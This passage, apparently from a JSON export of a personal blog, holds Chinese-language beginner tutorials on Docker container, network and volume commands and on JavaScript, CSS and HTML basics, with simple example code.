-a`\ndocker wait &lt;CONTAINER_ID>   ------ 阻塞对容器的其他调用方法，直到容器停止后退出\n\ndocker top &lt;CONTAINER_ID>    ------ 查看容器中运行的进程\ndocker diff &lt;CONTAINER_ID>   ------ 查看容器中的变化\ndocker inspect &lt;CONTAINER_ID> ------ 查看容器详细信息（输出为Json）\n-f：查找特定信息，如\n    docker inspect -f '{{ .NetworkSettings.IPAddress }}'\n    docker commit -m \"comment\" -a \"author\" &lt;CONTAINER_ID>  ouruser/imagename:tag\n--------------------------------------------------------------------------------\ndocker extc -it &lt;CONTAINER> &lt;COMMAND>\n                             ------ 在容器里执行命令，并输出结果\ndocker exec -i -t &lt;CONTAINER_ID> /bin/bash\n                             ------ 重新进入守护式进程            \n\n\n3.3 网络管理docker run -P                         ------ 随机分配端口号\ndocker run -p 2560:5000               ------ 绑定特定端口号（主机的所有网络接口的2560端口均绑定容器的5000端口）\ndocker run -p 127.0.0.1:5000:5000     ------ 绑定主机的特定接口的端口号\ndocker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py\n                                      ------ 绑定udp端口号\ndocker port &lt;CONTAINER_ID> 5000       ------ 查看容器的5000端口对应本地机器的IP和端口号\n--------------------------------------------------------------------------------\n使用Docker Linking连接容器：\nDocker为源容器和接收容器创建一个安全的通道，容器之间不需要暴露端口，接收的容器可以访问源容器的数据\ndocker run -d -P --name &lt;CONTAINER_NAME> --link &lt;CONTAINER_NAME_TO_LINK>:&lt;ALIAS>  \n\n\n3.4 数据管理Data Volumes：volume是在一个或多个容器里指定的特殊目录\n\n数据卷可以在容器间共享和重复使用\n可以直接修改容器卷的数据\n容器卷里的数据不会被包含到镜像中\n容器卷保持到没有容器再使用它\n\na. 可以在容器启动的时候添加-v参数指定容器卷，也可以在Dockerfile里用VOLUMN命令添加docker run -d -P --name web -v /webapp training/webapp python app.py\nb. 也可以将容器卷挂载到宿主机目录或宿主机的文件上，&lt;容器目录或文件&gt;的内容会被替换为&lt;宿主机目录或文件&gt;的内容，默认容器对这个目录有可读写权限docker run -d -P --name web -v &lt;宿主机目录&gt;:&lt;容器目录&gt; training/webapp python app.py\nc. 可以通过指定ro，将权限改为只读docker run -d -P --name web -v &lt;宿主机目录&gt;:&lt;容器目录&gt;:ro training/webapp python app.py\nd. 在一个容器创建容器卷后，其他容器便可以通过--volumes-from共享这个容器卷数据，如下：docker run -d -v /dbdata --name db1 training/postgres echo Data-only container for postgres首先启动了一个容器，并为这个容器增加一个数据卷/dbdata，然后启动另一个容器，共享这个数据卷\ne. docker run -d --volumes-from db1 --name db2 training/postgres此时db2使用了db1的容器卷，当容器db1被删除时，容器卷也不会被删除，只有所有容器不再使用此容器卷时，才会被删除docker rm -v ：删除容器卷\nf. 除了共享数据外，容器卷另一个作用是用来备份、恢复和迁移数据docker run --volumes-from db1 -v /home/backup:/backup ubuntu tar cvf /backup/backup.tar /dbdata\ng. 启动一个容器数据卷使用db1容器的数据卷，同时新建立一个数据卷指向宿主机目录/home/backup，将/dbdata目录的数据压缩为/backup/backup.tar\nh. docker run -v /dbdata --name dbdata2 ubuntu /bin/bashdocker run --volumes-from dbdata2 -v /home/backup:/backup busybox tar xvf /backup/backup.tar启动一个容器，同时把backup.tar的内容解压到容器的 backup\n\n仓库管理\ndocker login ：登录\n","thumbnail":"https://i.loli.net/2019/03/01/5c780b7be7025.jpg","plink":"https://Directoree.github.io/post/docker/"},{"title":"JavaScript","date":"2019-03-12T12:29:00.000Z","updated":"2019-03-12T12:42:21.442Z","content":"JavaScript 语句和 JavaScript 变量都对大小写敏感。( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾\n\n\nJavaScript 基础 \n\n\n\n\n\n一. JavaScript 简介\n1.1 JavaScript 由来（1） 关于JavaScript\n\n在上个世纪的1995年，当时的网景公司正凭借其Navigator浏览器成为Web时代开启时最著名的第一代互联网公司。\n由于网景公司希望能在静态HTML页面上添加一些动态效果，于是叫Brendan Eich这哥们在两周之内设计出了JavaScript语言。你没看错，这哥们只用了10天时间。\n为什么起名叫JavaScript？原因是当时Java语言非常红火，所以网景公司希望借Java的名气来推广，但事实上JavaScript除了语法上有点像Java，其他部分基本上没啥关系。\n\nECMAScript\n因为网景开发了JavaScript，一年后微软又模仿JavaScript开发了JScript，为了让JavaScript成为全球标准，几个公司联合ECMA（European Computer Manufacturers Association）组织定制了JavaScript语言的标准，被称为ECMAScript标准。\n所以简单说来就是，ECMAScript是一种语言标准，而JavaScript是网景公司对ECMAScript标准的一种实现。\n那为什么不直接把JavaScript定为标准呢？因为JavaScript是网景的注册商标。\n不过大多数时候，我们还是用JavaScript这个词。如果你遇到ECMAScript这个词，简单把它替换为JavaScript就行了。\n\nJavaScript版本\nJavaScript语言是在10天时间内设计出来的，虽然语言的设计者水平非常NB，但谁也架不住“时间紧，任务重”，所以，JavaScript有很多设计缺陷，我们后面会慢慢讲到。\n此外，由于JavaScript的标准——ECMAScript在不断发展，最新版ECMAScript 6标准（简称ES6）已经在2015年6月正式发布了，所以，讲到JavaScript的版本，实际上就是说它实现了ECMAScript标准的哪个版本。\n由于浏览器在发布时就确定了JavaScript的版本，加上很多用户还在使用IE6这种古老的浏览器，这就导致你在写JavaScript的时候，要照顾一下老用户，不能一上来就用最新的ES6标准写，否则，老用户的浏览器是无法运行新版本的JavaScript代码的。\n\n（2） JavaScript是什么？\n\n\nJavaScript是一种小型的、轻量级的、面向对象的、跨平台的客户端脚本语言。\n\nJavaScript是嵌入到浏览器软件当中的去的，只要你的电脑有浏览器就可以执行JS程序了。JavaScript是一种面向对象的程序语言。在程序中，对象是由“属性”和“方法”构成。\n\n跨平台：JS程序可以在多种平台下运行，如：windows、linux、mac、IOS等。\n\n客户端脚本程序：JS只能在客户端的浏览器来运行，不能在服务器端来运行。\n\n浏览器是一个翻译器，可以翻译三种代码：HTML代码、CSS代码、JavaScript代码。\n\nJavaScript 是可插入 HTML 页面的编程代码。\n\n\n注：JS中的对象只要会用就可以了，不需要我们自己去开发对象。\n\n（3） JavaScript能干什么？\n\n\n表单验证：是JS最基本的功能。\n\n动态HTML：可以实现一些动态的、重复的效果。\n\n交互式：人机交互，通过键盘或鼠标，与网页中的元素进行交互。\n\n\n\n\n1.2 JavaScript 规则（1） JavaScript用法\n\n\n同一个网页中，可以有HTML代码、CSS代码、JavaScript代码。\n\n通过&lt;script&gt;&lt;/script&gt;来引入JS程序代码。即HTML 中的脚本必须位于 &lt;script&gt; 与 &lt;/script&gt; 标签之间。&lt;script&gt; 和 &lt;/script&gt; 会告诉 JavaScript 在何处开始和结束。\n\n\n\n（2） 脚本的放置位置\n\n脚本可被放置在：\n\n放在HTML页面的&lt;head&gt;&lt;/head&gt; 里；\n放在HTML页面的 &lt;body&gt;&lt;/body&gt; 里；或者同时放在二者中；\n放在外部 .js文件里，这个文件里面直接写js脚本，不用再写&lt;script&gt;&lt;/script&gt;这两个标签。\n\n\na. 把 JavaScript 代码放在&lt;head&gt;&lt;/head&gt; 和放在 &lt;body&gt;&lt;/body&gt; 里的区别：\n\n简单地说，放在 &lt;head&gt;&lt;/head&gt; 里的会比放在 &lt;body&gt;&lt;/body&gt; 先执行。head 标签里的代码会在页面还未开始绘制之前被解析，而在 body 里的代码则会在页面渲染的同时在读取到这段代码的时候才被执行。\n通常的做法是把函数放入 &lt;head&gt; 部分中，或者放在页面底部。这样就可以把它们安置到同一处位置，不会干扰页面的内容。\n\n\nb. 外部的 JavaScript\n\n也可以把脚本保存到外部文件中。外部文件通常包含被多个网页使用的代码。\n外部 JavaScript 文件的文件扩展名是 .js。\n如需使用外部文件，请在 &lt;script&gt; 标签的 “src” 属性中设置该 .js 文件：\n可以将脚本放置于 &lt;head&gt; 或者 &lt;body&gt;中，放在 &lt;script&gt; 标签中的脚本与外部引用的脚本运行效果完全一致。\n\n实例：\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;body>\n&lt;script src=\"myScript.js\">&lt;/script>\n&lt;/body>\n&lt;/html>\n\n\n说明：那些老旧的实例可能会在 &lt;script&gt; 标签中使用 type=&quot;text/javascript&quot;。现在已经不必这样做了。JavaScript 是所有现代浏览器以及 HTML5 中的默认脚本语言。\n\n\n（3） 关于注释\n\n\nC/C++/C#/Java/JavaScript：单行使用//,多行使用/*...*/\n\nMYSQL/Python：#\n\nPHP：单行使用//，多行使用三对单引号或者双引号\n\nCSS：/*...*/\n\nHTML：&lt;!--注释内容--&gt;\n\n\n\n\n1.3 JavaScript 输出\nJavaScript 显示数据\n\n使用 window.alert() 弹出警告框。\n使用 document.write() 方法将内容写到 HTML 文档中。\n使用 innerHTML 写入到 HTML 元素。\n使用 console.log() 写入到浏览器的控制台。\n\n\n\n（1） window.alert(str) 弹出警告框\n\n\n描述：在当前窗口中弹出一个警告对话框，str为对话框中显示的内容。window：代表当前浏览器窗口，window是一个窗口对象。alert()：弹出一个对话框。str：表示要输出的内容。\n\n\n实例：\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n&lt;meta charset=\"utf-8\">\n&lt;title>来试一波&lt;/title>\n&lt;/head>\n&lt;body background=\"https://i.loli.net/2019/03/12/5c877dd02cfeb.jpg\">\n\n&lt;h1>我的第一个页面&lt;/h1>\n&lt;p>我的第一个段落。&lt;/p>\n&lt;script>\nwindow.alert(5 + 6);\n&lt;/script>\n\n&lt;/body>\n&lt;/html>\n\n\n\n（2） document.write(str) 写到 HTML 文档\n\n\n描述：\n\ndocument意思“文档”，就是整个网页了。\ndocument是一个文档对象，代表整个网页。\nwrite()是document对象的一个输出方法。\n“.”小数点：通过小数点(.)来调用对象的方法。\nstr：表示要输出的内容。\n\n\n注意事项：\n\n请使用 document.write() 仅仅向文档输出写内容。\n如果在文档已完成加载后执行 document.write，整个 HTML 页面将被覆盖。\n\n\n下面实例说明document.write()在文档加载完后执行将会覆盖之前的页面：\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head> \n&lt;meta charset=\"utf-8\"> \n&lt;title>点击“点我”前的页面&lt;/title> \n&lt;/head>\n&lt;body>\n\n&lt;h1>这是“点我”前的页面Web 页面&lt;/h1>\n&lt;p>我的第一个段落。&lt;/p>\n&lt;button onclick=\"myFunction()\">点我&lt;/button>\n&lt;script>\nfunction myFunction() \n{\n    document.write(Date());\n}\n&lt;/script>\n\n&lt;/body>\n&lt;/html>\n\n\n在没有点击“点我”前的页面：\n\n在点击“点我”后的页面：\n\n\n（3） innerHTML 操作 HTML 元素\n\n\n描述：\n\ninnerHTML用于操作 HTML 元素。\n如需从 JavaScript 访问某个 HTML 元素，您可以使用 document.getElementById(id) 方法。\n请使用 “id” 属性来标识 HTML 元素，并 innerHTML 来获取或插入元素内容：\n\n\n实例：\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head> \n&lt;meta charset=\"utf-8\"> \n&lt;title>再来试一波&lt;/title> \n&lt;/head>\n&lt;body background=\"https://i.loli.net/2019/03/12/5c8780490c44e.jpg\">\n\n&lt;h1>我的第一个 Web 页面&lt;/h1>\n&lt;p id=\"demo\">我的第一个段落。&lt;/p>\n&lt;script>\ndocument.getElementById(\"demo\").innerHTML=\"段落已修改。\";\n&lt;/script>\n\n&lt;/body>\n&lt;/html>\n\n\n说明：以上 JavaScript 语句（在 &lt;script&gt; 标签中）可以在 web 浏览器中执行：\n\ndocument.getElementById(&quot;demo&quot;) ：是使用 id 属性来查找 HTML 元素的 JavaScript 代码 。\ninnerHTML = &quot;段落已修改。&quot;： 是用于修改元素的 HTML 内容(innerHTML)的 JavaScript 代码。\n\n\n（4） console.log() 写到控制台。\n\n如果您的浏览器支持调试，你可以使用 console.log() 方法在浏览器中显示 JavaScript 值。\n浏览器中使用 F12 来启用调试模式， 在调试窗口中点击 “Console” 菜单。\nTip：程序中调试是测试，查找及减少bug(错误)的过程。\n\n下面实例代码先写到一个 .html的文档里，然后在浏览器运行这个文档。运行后启用调试模式点击”Console” 菜单即可看到输出结果：\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head> \n&lt;meta charset=\"utf-8\"> \n&lt;title>输出到控制台&lt;/title> \n&lt;/head>\n&lt;body background=\"https://i.loli.net/2019/03/12/5c8787ce408d7.jpg\">\n\n&lt;h1>注意要启动调试模式&lt;/h1>\n&lt;p>\n浏览器中(Chrome, IE, Firefox) 使用 F12 来启用调试模式， 在调试窗口中点击 \"Console\" 菜单。\n&lt;/p>\n&lt;script>\na = 5;\nb = 6;\nc = a + b;\nconsole.log(c);\n&lt;/script>\n\n&lt;/body>\n&lt;/html>\n\n\n\n\n二. JavaScript 语法\n2.1 基本法则\n\n声明变量：使用关键字var，如：var name; var num=12;\n命名规则：变量名不能以数字开头，可以是字母或下划线开头。变量名可以包含字母、数字、下划线。\n大小写敏感：JS中的变量名是区分大小写的。\n驼峰式命名：第一个单词全小写，后面的每一个单词首字母大写。如：var  getUserName;\n语句块：花括号{...}，JavaScript的语法和Java语言类似\n语句结束符：英文分号;，JavaScript的语法和Java语言类似\n缩进：花括号{…}内的语句具有缩进，通常是4个空格，并不强制使用。缩进有助于我们理解代码的层次。\n注释：单行//，多行/*...*/，不是所有的 JavaScript 语句都是”命令”。\n空格：JavaScript 会忽略多余的空格。可以向脚本添加空格，来提高其可读性。\n一行：一行代码可包含多个语句，每个语句用;表示语句结束。但 不建议一行写多个语句!（因为要层次感）\n多行：文本字符串中使用反斜杠\\对代码行进行换行。但是只能字符串使用，变量名函数名等其他不能使用。\n\n\n如：document.write(&quot;你好 \\世界!&quot;);\n提示：JavaScript 是脚本语言。浏览器会在读取代码时，逐行地执行脚本代码。而对于传统编程来说，会在执行前对所有代码进行编译。\n\nTip1：以下是 JavaScript 中最​​重要的保留字（按字母顺序）：Tip2：JavaScript 有多种数据类型：数字，字符串，数组，对象等等（在编程语言中，一般固定值称为字面量，如 3.14。）：\n\nvar length = 16;                                  // Number 通过数字字面量赋值 \nvar points = x * 10;                              // Number 通过表达式字面量赋值\nvar lastName = \"Johnson\";                         // String 通过字符串字面量赋值\nvar cars = [\"Saab\", \"Volvo\", \"BMW\"];              // Array  通过数组字面量赋值\nvar person = {firstName:\"John\", lastName:\"Doe\"};  // Object 通过对象字面量赋值\n\n\nTip3：JavaScript 语句通常以一个 语句标识符 为开始，并执行该语句。语句标识符是保留关键字不能作为变量名使用。下表列出了 JavaScript 语句标识符 (关键字) ：\n\n\n2.2 变量和数据类型\n（1） 变量\n\n变量是有数据类型的，这个类型来源于“变量的值”，换句话说：值是什么类型的，变量就是什么类型的。\n这种变量本身类型不固定的语言称之为动态语言，与之对应的是静态语言。静态语言在定义变量时必须指定变量类型，如果赋值的时候类型不匹配，就会报错。例如Java是静态语言，赋值语句如下：\nint a = 123; // a是整数类型变量，类型用int申明a = “ABC”; // 错误：不能把字符串赋给整型变量\n和静态语言相比，动态语言更灵活，就是这个原因。\n\n变量命名规则：\n\n变量必须以字母开头\n变量也能以 $ 和 _ 符号开头（不过我们不推荐这么做）\n变量名称对大小写敏感（y 和 Y 是不同的变量）\n\n\n\n您可以在一条语句中声明很多变量。该语句以 var 开头，并使用逗号分隔变量即可：\nvar lastname=\"Doe\", age=30, job=\"carpenter\";\n\n声明也可横跨多行：\nvar lastname=\"Doe\",\nage=30,\njob=\"carpenter\";\n\n但是一条语句中声明的多个不可以赋同一个值（x,y 为 undefined， z 为 14。）：）:\nvar x,y,z=1;\n\n\n（2） 数据类型\n\n\n\nJS中八种数据类型：Number（数值型）、String（字符串）、bool（布尔型）、undefined、null、array、object、function\n这八种数据类型，又分为两大类：\n","thumbnail":"https://i.loli.net/2019/03/12/5c87697410642.jpg","plink":"https://Directoree.github.io/post/JavaScript/"},{"title":"CSS 基础","date":"2019-03-11T04:00:00.000Z","updated":"2019-03-11T10:22:05.373Z","content":"hhh… ( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾\n\n\nCSS 基础 \n\n\n\n\n一. CSS 初识\nCSS是给HTML标记加的样式；JS是给HTML标记加的行为。HTML标记是最先出现的。\n\n\n\n\n\nCSS是什么?\n为什么要使用CSS?\nCSS和HTML是什么关系？\nCSS应该怎样使用？\n\n\n\n1. CSS是什么?\n\n\nCSS（Cascading Stylesheets，层叠样式表）。\n\nCSS的主要目的：是给HTML标记添加各种各样的表现(格式、样式)。比如：文字样式、背景、文本样式、链接样式。\n\n是一种制作网页的新技术，现在已经为大多数的浏览器所支持，成为网页设计必不可少的工具之一。使用CSS能够简化网页的格式代码，加快下载显示的速度，也减少了需要上传的代码数量，大大减少了重复劳动的工作量。尤其是当你面对的是有数百个网页的站点时，CSS简直象是神对我们的恩赐！\n\n\n\n2. 为什么要使用CSS?\n\n\nHTML超文本标注语言：各种HTML标记。\nCSS层叠样式表：给HTML标记加的样式。\nJavaScript脚本程序：给HTML标记加的程序。\n\n   W3C（The World Wide Web Consortium）把动态HTML（Dynamic HTML）分为三个部分来实现：脚本语言（包括javascript、Vbscript等）、支持动态效果的浏览器（包括Internet Explorer、Netscape Navigator等）和CSS样式表。\n\n3. CSS和HTML是什么关系？\n\nCSS的主要目的：是给HTML标记添加各种各样的表现(格式、样式)。比如：文字样式、背景、文本样式、链接样式。\n\n4. CSS应该怎样使用？\n\n\n\n\n在HTML标签中直接使用。\n在HTML标签先定义属性id或者class，然后在&lt;head&gt;&lt;/head&gt;定义一个样式表来表现这个属性id或者class。\n\n\nCSS注释以 /* 开始, 以 */  结束, 实例如下:\n/*这是个注释*/\np\n{\ntext-align:center;\n/*这是另一个注释*/\ncolor:black;\nfont-family:arial;\n}\n\n\n\n二. CSS 框架CSS 规则由两个主要的部分构成：选择器，以及一条或多条声明\n\n\n选择器：就是选择HTML标记，换句话说：就是给哪个HTML标记加样式。格式声明语句：由{ }构成，{ }中每条声明由属性名:属性值;构成。\n\n\n注意：\n\n每个属性有一个值，属性和值被冒号:分开。属性和属性之间用英文分号；隔开。最后以分号；结束。\n属性值，一个属性名可以取不同的值，这个值不加引号。\nCSS中的数字单位都是px，这个px不能省略。\n\n\n\n2.1 CSS 样式要想在浏览器中显示出预期的CSS样式表效果，就要让浏览器识别并正确调用CSS。当浏览器读取样式表时，要依照文本格式来读，这里介绍四种在页面中插入CSS样式表的方法：链入外部样式表、内部样式表、导入外部样式表和内联样式。\n\n1. 链入外部样式表链入外部样式表：是把样式表（选择器+声明）保存为一个样式表.css文件，然后在页面中用&lt;link&gt;标记来链接到这个样式表文件，这个&lt;link&gt;标记必须放到页面的&lt;head&gt;...&lt;/head&gt;区内。\n如下：\n&lt;head> \n\n…… \n&lt;link href=\"mystyle.css\" rel=\"stylesheet\" type=\"text/css\" media=\"all\"> \n…… \n\n&lt;/head>\n\n\n\n上面这个例子表示浏览器从mystyle.css文件中以文档格式读出定义的样式表。href=&quot;mystyle.css&quot;是文件所在的位置。rel=&quot;stylesheet&quot;是指在页面中使用这个外部的样式表。rel 属性规定当前文档与被链接文档之间的关系。type=&quot;text/css&quot;是指文件的类型是样式表文本。media是选择媒体类型，这些媒体包括：屏幕，纸张，语音合成设备，盲文阅读设备等。\n\n　　一个外部样式表文件可以应用于多个页面。当你改变这个样式表文件时，所有页面的样式都随之而改变。在制作大量相同样式页面的网站时，非常有用，不仅减少了重复的工作量，而且有利于以后的修改、编辑，浏览时也减少了重复下载代码。\n\n注意：样式表文件可以用任何文本编辑器（例如：记事本）打开并编辑，一般样式表文件扩展名为.css。内容是定义的样式表，不包含HTML标记，mystyle.css这个文件的内容如下：\n\nhr {color: sienna} \n\np {margin-left: 20px} \n\nbody {background-image: url(\"images/back40.gif\")} \n/*定义水平线的颜色为土黄；段落左边的空白边距为20象素；页面的背景图片为images目录下的back40.gif文件*/\n\n\n2. 内部样式表内部样式表：是把样式表放到页面的&lt;head&gt;...&lt;/head&gt;区里，这些定义的样式就应用到页面中了，样式表是用&lt;style&gt;&lt;/style&gt;标记插入的。\n从下例中可以看出&lt;style&gt;&lt;/style&gt;标记的用法：\n&lt;head> \n…… \n&lt;style type=\"text/css\"> \nhr {color: sienna} \np {margin-left: 20px} \nbody {background-image: url(\"images/back40.gif\")} \n&lt;/style> \n…… \n&lt;/head>\n\n\n3. 导入外部样式表 导入外部样式表：是指在内部样式表的&lt;style&gt;&lt;/style&gt;里导入一个外部样式表，导入时用@import。\n示例：\n&lt;head> \n…… \n&lt;style type=\"text/css\"> \n&lt;!-- \n@import \"mystyle.css\" \n其他样式表的声明 \n--> \n&lt;/style> \n…… \n&lt;/head>\n\n\n例中@import &quot;mystyle.css&quot;表示导入mystyle.css样式表，注意使用时外部样式表的路径。方法和链入样式表的方法很相似，但导入外部样式表输入方式更有优势。实质上它相当于存在内部样式表中的。 \n注意：导入外部样式表必须在样式表的开始部分，在其他内部样式表上面。\n\n\n\n\n\n\n4. 内联样式内联样式：是混合在HTML标记里使用的，用这种方法，可以很简单的对某个元素单独定义样式。内联样式的使用是直接将在HTML标记里加入style参数。而style参数的内容就是CSS的属性和值\n示例：\n&lt;p style=\"color: sienna;margin-left: 20px;\"> \n\n这是一个段落 \n\n&lt;/p> \n&lt;!--这个段落颜色为土黄，左边距为20象素-->\n\n\n在style参数后面的引号里的内容相当于在样式表大括号里的内容。 \n注意：style参数可以应用于任意BODY内的元素（包括BODY本身），除了BASEFONT、PARAM和SCRIPT。\n\n\n5. 多重样式表叠加的优先级CSS样式表有层叠顺序，这里我们讨论插入样式表的这几种方法的叠加，如果在同一个选择器上使用几个不同的样式表时，这个属性值将会叠加几个样式表，遇到冲突的地方会以最后定义的为准。例如，我们首先链入&lt;link&gt;一个外部样式表，其中定义了h3选择符的color、text-alig和font-size属性：\nh3 \n{ \ncolor: red; \ntext-align: left; \nfont-size: 8pt; \n} \n/*标题3的文字颜色为红色；向左对齐；文字尺寸为8号字*/\n\n然后在内部样式表里也定义了h3选择符的text-align和font-size属性：\nh3 \n{ \ntext-align: right; \nfont-size: 20pt; \n} \n/*标题3文字向右对齐；尺寸为20号字*/\n\n那么这个页面叠加后的样式就是：\ncolor: red; \n\ntext-align: right; \n\nfont-size: 20pt; \n/*文字颜色为红色；向右对齐；尺寸为20号字*/\n\n字体颜色从外部样式表里保留下来，而对齐方式和字体尺寸都有定义时，按照后定义的优先而依照内部样式表。\n\nw3school给出的优先级顺序从低到高是：浏览器缺省设置外部样式表内部样式表（位于 &lt;head&gt; 标签内部）内联样式（在 HTML 元素内部）因此，内联样式（在 HTML 元素内部）拥有最高的优先权，这意味着它将优先于以下的样式声明： 标签中的样式声明，外部样式表中的样式声明，或者浏览器中的样式声明（缺省值）。可参考：《css的样式优先级》 \n\n\n\n\n\n\n2.2 CSS 选择器在 CSS 中，选择器是一种模式，用于选择需要添加样式的元素。属性选择器可以根据元素的属性及属性值来选择元素。\n三种基本的选择器类型：标签名选择器、类选择器、ID选择器\n注意：在标签内写入style=” “的方式，应该是CSS的一种引入方式，而不是选择器，因为根本就没有用到选择器。\n\n\n1. 基本选择器（1）标签名选择器\n\n一个HTML文档中有许多标签，例如p标签，h1标签等。若要使文档中的所有p标签都使用同一个CSS样式，就应使用标签选择器。 \n注意：CSS标签选择器，与HTML标签的名称一样，但不能加尖括号。示例：\n\n&lt;head>\n    &lt;style type=\"text/css\">\n       h1{\n         color:red;\n         }\n       p{\n         color:blue;\n        }\n    &lt;/style>\n&lt;/head>\n\n\n（2）类选择器\n\n\n使用标签选择器可以为整个HTML文档中的同一个标签指定相同的CSS样式。但是在实际运用中，HTML文档中的同一个标签会被反复使用。若要为相同的标签赋予不同的CSS样式就应使用类选择器。 \n\n描述：给一类HTML标签加样式。这里所指的“一类”是：每个HTML标签都有一个class属性，且class的值一样。class属性是公共属性，每个HTML标签都有。\n\n类选择器的名称，必须以.开头，后限HTML标签的class属性的值。如：.box{ color:red; }\n\n\n示例：\n&lt;!DOCTYPE HTML>\n&lt;html>\n    &lt;head>\n           &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n           &lt;title>测试一下&lt;/title>\n\n           &lt;style type=\"text/css\">\n                .NO1{\n                      color:red;\n                      background-color:#88ff66;\n                    }      //无;或,号\n               .test{\n                       color:red;\n                       border:1px blue solid;\n                     } \n          &lt;/style>\n    &lt;/head>\n    &lt;body>\n        &lt;h1 class=\"NO1\">习近平心中的互联网&lt;/h1>\n        &lt;div class=\"test\">测试代码&lt;/div> \n    &lt;/body>\n&lt;/html>\n\n\n\n这种定义class 的方式是前端开发最常用的选择器，有几个突出的特点：可以给不同的标签设置同一个类，从而用一条CSS命令控制几个标签，减少大量代码，是页面修改简单，易维护，易改版；其次，后台工作人员机会不会用到有关class的相关设置，不需要跟后台人员之间进行交互；再者，可以通过js等动态改变标签的Classname，从而改变整个标签的样式，使前端动态效果实现起来更为容易。\n\n\n（3）id选择器\n\n\nID选择器和类选择器相似，不同的是，ID选择器不能复用。在一个XHTML文档中，一个ID选择器只能把其CSS样式指定给一个标签。 \n\n注：网页中HTML标签的id属性的值，必须是唯一的。id属性一般是给JS使用的，不是让你来加样式的。class属性只能给CSS用，不能给JS用的。\n\nid选择器的名称，必须以#开头，后跟HTML标记的id属性的值。\n\n\n示例：\n&lt;!DOCTYPE HTML>\n&lt;html>\n    &lt;head>\n        &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n        &lt;title>php.cn&lt;/title>\n    &lt;style type=\"text/css\">\n    #NO1{\n        color:blue;\n        background-color:#88ff99;\n    }\n    .haha{\n         color:red;\n         background-color:#88ff66;\n     }\n    &lt;/style>\n    &lt;/head>\n    &lt;body>\n        &lt;h1 id=\"NO1\">习近平心中的互联网&lt;/h1>\n        &lt;p class=\"haha\">互联网是20世纪最伟大的发明。&lt;/p>\n    &lt;/body>\n&lt;/html>\n\n\n（4）选择器的优先级\n\n参考：\n《CSS 样式优先级》《CSS样式优先级问题》 \n\n\n\n\n\n选择器的优先级从高到低：ID 选择器， 如 #id{}类选择器， 如 .class{}属性选择器， 如 a[href=&quot;segmentfault.com&quot;]{}伪类选择器， 如 :hover{}伪元素选择器， 如 ::before{}标签选择器， 如 span{}通配选择器， 如 *{}\n\n\n2. id、class选择器的区别id和class属性是网页中两个通用的属性，它们协同工作使整个页面变得丰富多彩。当我们为一个元素定义样式时。可以使用id，也可以使用class。但是我们也应该注意这两者的区别。 \n\n在css样式表中书写时，id选择符前面应该加前缀符号‘#’，而class选择符前面应该加前缀符号‘.’。 \n\nid属性一般在一个页面中只可以使用一次，而class可以被多次引用。 \n\nid作为元素的标签，用于区分不同结构和内容，而class作为一个样式，它可以应用到任何结构和内容上。 \n\n在布局思路上，一般坚持这样的原则：id是先确定页面的结构和内容，然后再为它定义样式：而class相反，它先定义好一类样式，然后再页面中根据需要把类样式应用到不同的元素和内容上面。 \n\n目前浏览器都能允许在同一个页面内出现多个相同属性值的id，一般情况下也能正常显示，不过当使用javascript通过id来控制元素时就会出现错误。 \n\n在实际应用时，class更多的被应用到文字版块以及页面修饰等方面，而id更多地被用来实现宏伟布局和设计包含块，或包含框的样式。 \n\n\n\n注意：\n\nID 有高优先级、唯一性的特点，特指「个体」。相对于 ID，class 的优先级比较适中，特指「特定群体」。Class 的使用需要参考面向对象的抽象概念，把共有的属性抽象出来。\nID是先找到结构/内容，再给它定义样式；Class是先定义好一种样式，再套给多个结构/内容\n\n\n\n3. 组合选择器《CSS 组合选择器》《CSS基础教程之组合选择器》 \n\n\n\n\n\n\n","thumbnail":"https://i.loli.net/2019/03/10/5c84eb5057598.jpg","plink":"https://Directoree.github.io/post/HTML-CSS/"},{"title":"HTML-基础","date":"2019-03-09T12:15:19.000Z","updated":"2019-03-11T13:13:08.032Z","content":"使用HTML标记实际上也就是使用标签和其属性 ( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾\n\n\nHTML 基础 \n\n\n\n\n\n\n\n\n一. HTML 初识当您保存 HTML 文件时，既可以使用 .htm 也可以使用 .html 扩展名。两者没有区别，完全根据您的喜好。\n\nHTML标签编写规范\nHTML标记不区分大小写。如：&lt;font&gt;、&lt;Font&gt;、&lt;fOnt&gt;。单特殊符号必须小写，如&amp;nbsp。\nHTML标记属性可有可无。有的标记是没有属性的，如：&lt;html&gt;、&lt;head&gt;、&lt;title&gt;等\n双边标记的内容在开始和结束标签之间，单边标记没有内容。\nHTML标记可以相互嵌套，但一定注意是顺序嵌套，外层套内层，一层套一层。\n\nHTML，Hypertext Markup Language ,超文本标注语言。HTML是一种规范，是一种标准，编写网页的一种标准。\n\n\n超文本：就是网页上不光有文本，还有图片、音乐、视频等。\n标注：是一种记号，是一种标志。如：红绿灯\n语言：这里的“语言”就是代码，跟所谓“程序语言”一点关系都没有。\n\nHTML的主要目的：就是用来显示网页的不同效果、不同部分。如：&lt;b&gt;文本&lt;/b&gt;\n\n\n1.1 HTML文件结构&lt;!DOCTYPE HTML>\n&lt;html>\n&lt;head>\n&lt;title>php.cn&lt;/title>\n&lt;/head>\n&lt;body>\n这里是存放网页内容的\n&lt;/body>\n&lt;/html>\n\n\nHTML 页面整体构成用浏览器打开任意一个网页，右键选择查看网页源码，就可以看到网站的HTML代码，总结一下，整体结构如下图：\n\n一、HTML文件结构的说明：\n\n\n&lt;!DOCTYPE HTML&gt;：html5标准网页声明，必须放在 HTML 文档的第一行，位于&lt;html&gt;标签之前。声明有助于浏览器中正确显示网页。\n\n&lt;html&gt;&lt;/html&gt;：告诉浏览器，其中的代码用什么格式(图片、视频)来编译。\n\n&lt;head&gt;&lt;/head&gt;：头部中包含的标记是页面的标题、序言、说明等内容，它本身不作为内容来显示，但影响网页显示的效果。\n\n下面这些标签可用在 head 部分：&lt;title&gt;,&lt;meta&gt;,  &lt;base&gt;, &lt;link&gt;, &lt;script&gt;, 